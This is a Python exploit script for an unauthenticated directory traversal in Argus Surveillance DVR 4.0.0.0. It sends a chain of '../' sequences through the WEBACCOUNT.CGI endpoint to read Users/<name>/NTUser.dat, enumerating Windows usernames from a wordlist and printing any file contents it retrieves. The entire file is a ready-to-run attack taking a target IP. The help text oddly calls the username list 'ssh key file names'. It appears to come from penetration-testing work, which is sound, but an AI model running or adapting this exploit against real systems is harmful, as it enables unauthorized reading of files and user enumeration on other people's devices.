#!/usr/bin/python3

# Exploit: Argus Surveillance DVR 4.0.0.0 - Directory Traversal
# Vendor: www.argussurveillance.com
#
# Description:
# This script uses the Argus Surveillance DVR 4.0.0.0 exploit that allows Unauthenticated Directory Traversal to  
# iterate over usernames searching for a NTUser.dat file in a home path.
import argparse
import requests
import pentest.wordlist as wordlist


def search_users(ip, usernames):

    URL = "http://" + ip + ":8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE="
    LFI = "../../../../../../../../../../../../../../../../"
    QUERY = "&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="

    count = 0

    for username in usernames:
        path = "Users/{}/NTUser.dat".format(username)
        payload = URL + LFI + path + QUERY
        response = requests.get(payload)
        count += 1
        if count % 1000 == 0: print("Requests completed: ", count, "/", len(usernames))
        if response.status_code == 200 and "<HTML>" not in response.text:
            print("Username found: ", username)
            print("Response: ")
            print(response.text, "\n")



def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("ip", help="ip of target.")
    parser.add_argument("filename", help="filename of possible ssh key file names.")
    args = parser.parse_args()

    username_list = wordlist.Wordlist(args.filename).words
    search_users(args.ip, username_list)


if __name__ == "__main__":
    main()
